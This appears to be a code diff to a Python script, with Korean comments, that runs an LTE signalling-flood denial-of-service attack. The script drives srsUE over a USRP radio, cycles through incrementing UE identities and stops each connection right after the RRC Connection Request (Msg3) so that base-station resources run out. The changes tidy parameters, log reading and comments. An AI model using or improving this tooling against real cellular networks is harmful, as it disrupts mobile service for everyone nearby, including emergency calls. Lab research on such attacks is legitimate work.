@@ -116,9 +116,9 @@ def run_srsue_with_config(config_path: str, log_file: str, usrp_args: Optional[s
 def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, running_flag=None,
                         mcc: Optional[int] = None, mnc: Optional[int] = None, 
                         earfcn: Optional[int] = None, usim_opc: Optional[str] = None,
-                        usim_k: Optional[str] = None, max_ue_count: int = 500):
+                        usim_k: Optional[str] = None):
     """
-    템플릿 config 파일과 동적 IMSI/IMEI 생성으로 공격을 실행합니다.
+    템플릿 config 파일을 사용하여 공격을 실행합니다.
     
     Args:
         template_config: 템플릿 config 파일 경로
@@ -129,21 +129,18 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
         earfcn: 주파수 채널 번호
         usim_opc: USIM OPC 키
         usim_k: USIM K 키
-        max_ue_count: 사용하지 않음 (하위 호환성 유지용, UE ID는 계속 증가)
     """
     if not os.path.exists(template_config):
         logger.error(f"템플릿 config 파일을 찾을 수 없습니다: {template_config}")
         return
     
     logger.info(f"템플릿 config: {template_config}")
-    logger.info(f"UE ID는 1부터 계속 증가하며 공격 시작 (하나의 USRP 사용)...")
-    logger.info("공격 모드: RRC Connection Request까지만 전송 후 즉시 종료 (DoS 최적화)")
+    logger.info("공격 모드: msg3까지만 보내고 다음 프로세스")
     
     ue_id = 1
     current_process = None
     process_start_time = None
     current_log_file = None
-    # 타임아웃 제거: 로그 기반으로만 종료
     
     try:
         loop_count = 0
@@ -218,8 +215,10 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                 # 로그 파일이 생성되었는지 확인
                 if current_log_file and os.path.exists(current_log_file):
                     try:
+                        # 마지막 100줄만 읽기 (효율성 개선)
                         with open(current_log_file, 'r', encoding='utf-8', errors='ignore') as f:
-                            log_content = f.read()
+                            lines = f.readlines()
+                            log_content = ''.join(lines[-100:]) if len(lines) > 100 else ''.join(lines)
                         
                         # RRC Connection Request 전송 확인 (Msg3 - 핵심!)
                         # 실제로 eNB로 전송되었는지 확인해야 함
@@ -290,11 +289,6 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                     elif elapsed > 1.0 and int(elapsed) % 2 == 0:  # 2초마다 한 번씩 로그
                         logger.info(f"로그 파일 대기 중: {current_log_file} (경과: {elapsed:.1f}초, 프로세스 실행 중)")
             
-            # 타임아웃 체크 제거 (로그 기반으로만 종료)
-            
-            # 짧은 대기 후 다시 확인
-            
-            # 짧은 대기 후 다시 확인
             time.sleep(0.1)
             
     except KeyboardInterrupt:
